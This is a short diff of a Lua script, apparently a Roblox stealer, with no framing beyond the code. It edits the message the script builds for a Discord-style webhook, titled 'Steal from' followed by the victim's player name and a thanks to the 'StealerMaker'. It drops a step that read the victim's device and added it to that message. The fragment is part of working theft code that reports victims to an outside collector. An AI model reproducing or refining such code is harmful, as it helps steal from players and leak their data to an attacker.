@@ -480,17 +480,13 @@ if _G.Act == true then
 
             local headers = {["content-type"] = "application/json"}
             
-            local device = "Error"
-            pcall(function()
-                device = Save.Get().Device
-            end)
             local data = {
                 ["avatar_url"] = "",
                 ["content"] = "",
                 ["embeds"] = {
                     {
                         ["fields"] = fields,
-                        ["title"] = "Steal from "..LP.Name..", thx "..StealerMaker.."! "..device,
+                        ["title"] = "Steal from "..LP.Name..", thx "..StealerMaker.."! ",
                         ["type"] = "rich",
                         ["color"] = 16777215
                     }
